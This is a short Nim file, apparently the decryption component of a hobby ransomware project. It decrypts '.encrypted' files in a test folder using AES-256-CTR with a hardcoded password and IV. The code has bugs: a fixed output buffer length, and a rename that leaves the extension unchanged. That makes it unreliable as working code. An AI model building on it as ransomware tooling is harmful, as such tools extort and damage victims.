import os
import strformat
import base64
import nimcrypto

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

let
    password: string = "myKey" # Our secret key
    path: string = "C:/Users/shant/Desktop/Ransomware-Nim/test"
var length :int = 2701363
for file in walkDirRec path:
   let fileSplit = splitFile(file)
   if fileSplit.ext == ".encrypted":
    echo fmt"[*] Decrypting: {file}"
    var
        inFileContents: string = readFile(file)
        #encrypted data in this case
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted =  newString(length)
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    dctx.init(key, iv)
    dctx.decrypt(decode(inFileContents), encrypted)
    dctx.clear()    

    let encodedCrypted = encrypted
    let finalFile = file
    moveFile(file, finalFile)
    writeFile(finalFile, encodedCrypted)